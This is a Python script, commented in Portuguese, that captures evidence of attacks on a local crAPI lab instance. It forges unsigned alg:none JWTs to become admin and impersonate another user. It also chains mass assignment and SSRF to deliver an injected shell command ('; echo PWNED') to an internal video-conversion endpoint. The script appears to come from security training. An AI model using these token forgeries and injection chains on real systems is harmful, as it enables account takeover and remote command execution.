#!/usr/bin/env python3
"""
Captura as evidências dos ataques "extra" contra uma instância LOCAL do crAPI:

  07 - Forja de JWT (a assinatura não é verificada: alg:none e payload adulterado)
  08 - Shell Injection encadeando Mass Assignment (conversion_params) + SSRF
       (chamada ao endpoint interno convert_video)

Esses dois não cabem só em `curl`, por isso ficam num script Python à parte do
`capturar-evidencias.sh`.

Pré-requisitos: crAPI rodando localmente e a conta do atacante registrada.

Uso:
  BASE_URL=http://localhost:8888 \
  EMAIL_ATACANTE=atacante@teste.local SENHA_ATACANTE='...' \
  python3 scripts/capturar-extras.py

ATENÇÃO: só contra o ambiente de laboratório.
"""
import os, json, base64, time, urllib.request, urllib.error, pathlib

BASE = os.environ.get("BASE_URL", "http://localhost:8888")
EMAIL = os.environ.get("EMAIL_ATACANTE", "atacante@teste.local")
SENHA = os.environ.get("SENHA_ATACANTE", "Atacante@2026!")
ROOT = pathlib.Path(__file__).resolve().parent.parent
EV = ROOT / "evidencias"


def b64u(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def login(email, pw):
    d = json.dumps({"email": email, "password": pw}).encode()
    r = urllib.request.Request(BASE + "/identity/api/auth/login", data=d,
                               headers={"Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(r))["token"]


def req(method, path, token, body=None, read=400):
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + token}
    if data:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        x = urllib.request.urlopen(r)
        return x.status, x.read(read).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(read).decode(errors="replace")


def forge_none(claims):
    return b64u(json.dumps({"alg": "none", "typ": "JWT"})) + "." + b64u(json.dumps(claims)) + "."


def main():
    utok = login(EMAIL, SENHA)
    h, p, s = utok.split(".")
    payload = json.loads(base64.urlsafe_b64decode(p + "=="))

    # ------------------------------------------------------------------ 07 JWT
    lines = []
    lines.append("# Forja de JWT (API2) — a assinatura não é verificada\n")
    lines.append(f"# Header do token legítimo: {base64.urlsafe_b64decode(h+'==').decode()}")
    lines.append(f"# Payload do token legítimo: {payload}")
    lines.append(f"# Token legítimo -> dashboard: HTTP {req('GET','/identity/api/v2/user/dashboard',utok)[0]}")
    lines.append("-" * 64)

    # A) alg:none com role=admin
    a = dict(payload); a["role"] = "admin"
    tok_a = forge_none(a)
    lines.append("# A) alg:none, role=admin (sem assinatura):")
    lines.append(f"#    -> HTTP {req('GET','/identity/api/v2/user/dashboard',tok_a)[0]}")

    # B) payload adulterado + assinatura RS256 original
    tok_b = h + "." + b64u(json.dumps(a)) + "." + s
    lines.append("# B) payload adulterado (role=admin) + assinatura original:")
    lines.append(f"#    -> HTTP {req('GET','/identity/api/v2/user/dashboard',tok_b)[0]}")

    # C) alg:none impersonando outro usuário (adam007)
    c = dict(payload); c["sub"] = "adam007@example.com"
    tok_c = forge_none(c)
    st, body = req("GET", "/identity/api/v2/user/dashboard", tok_c, read=200)
    lines.append("# C) alg:none, sub=adam007@example.com (impersonação de outro usuário):")
    lines.append(f"#    -> HTTP {st}  {body}")
    lines.append("-" * 64)
    lines.append("# Prova: o servidor aceita tokens sem assinatura válida (alg:none) e tokens")
    lines.append("# com payload adulterado. Permite virar admin e personificar qualquer usuário.")
    (EV / "07-jwt-forgery" / "captura.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("[ok] 07 JWT forgery")

    # -------------------------------------------------------- 08 Shell Injection
    # 1) upload de vídeo (para ter um video_id nosso)
    import tempfile
    tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
    tmp.write(b"FAKEVIDEO12345"); tmp.close()
    boundary = "----crapi"
    with open(tmp.name, "rb") as f:
        filedata = f.read()
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"v.mp4\"\r\n"
            f"Content-Type: video/mp4\r\n\r\n").encode() + filedata + f"\r\n--{boundary}--\r\n".encode()
    r = urllib.request.Request(BASE + "/identity/api/v2/user/videos", data=body,
                               headers={"Authorization": "Bearer " + utok,
                                        "Content-Type": f"multipart/form-data; boundary={boundary}"},
                               method="POST")
    up = json.load(urllib.request.urlopen(r))
    vid = up["id"]

    out = []
    out.append("# Shell Injection (encadeando Mass Assignment + SSRF)")
    out.append(f"# video_id do atacante: {vid}")
    out.append("-" * 64)
    # 2) Mass Assignment: gravar a propriedade interna conversion_params com comando injetado
    st, b = req("PUT", f"/identity/api/v2/user/videos/{vid}", utok,
                {"conversion_params": "-i /dev/null; echo PWNED"})
    out.append("# 1) Mass Assignment em conversion_params (propriedade interna):")
    out.append(f"#    PUT /identity/api/v2/user/videos/{vid}  -> HTTP {st}")
    out.append(f"#    {b}")
    # 3) convert_video direto pelo gateway é bloqueado (interno)
    st2, b2 = req("GET", f"/identity/api/v2/user/videos/convert_video?video_id={vid}", utok)
    out.append("# 2) convert_video pelo gateway público é bloqueado:")
    out.append(f"#    -> HTTP {st2}  {b2[:160]}")
    # 4) SSRF -> endpoint interno convert_video
    internal = f"http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id={vid}"
    ssrf_body = {"mechanic_code": "TRAC_JHN", "problem_details": "x", "mechanic_api": internal,
                 "vin": "0JATXVG6ESXV0HX6R", "number_of_repeats": 1}
    st3, b3 = req("POST", "/workshop/api/merchant/contact_mechanic", utok, ssrf_body, read=1200)
    out.append("# 3) SSRF (contact_mechanic) -> convert_video INTERNO:")
    out.append(f"#    mechanic_api = {internal}")
    out.append(f"#    -> HTTP {st3}")
    try:
        msg = json.loads(b3)["response_from_mechanic_api"]["message"]
        decoded = base64.b64decode(msg).decode(errors="replace")
        out.append("#    resposta (base64 decodificada):")
        for ln in decoded.splitlines():
            out.append("#      " + ln)
    except Exception:
        out.append("#    " + b3[:400])
    out.append("-" * 64)
    out.append("# Prova: o chain Mass Assignment + SSRF alcança o sink de shell injection")
    out.append("# (convert_video, que executa ffmpeg com conversion_params). A execução real")
    out.append("# de comandos fica atrás do flag de config 'block_shell_injections' (ligado por padrão).")
    (EV / "08-shell-injection" / "captura.txt").write_text("\n".join(out) + "\n", encoding="utf-8")
    os.unlink(tmp.name)
    print("[ok] 08 Shell Injection")
    print("Concluído. Evidências em", EV)


if __name__ == "__main__":
    main()
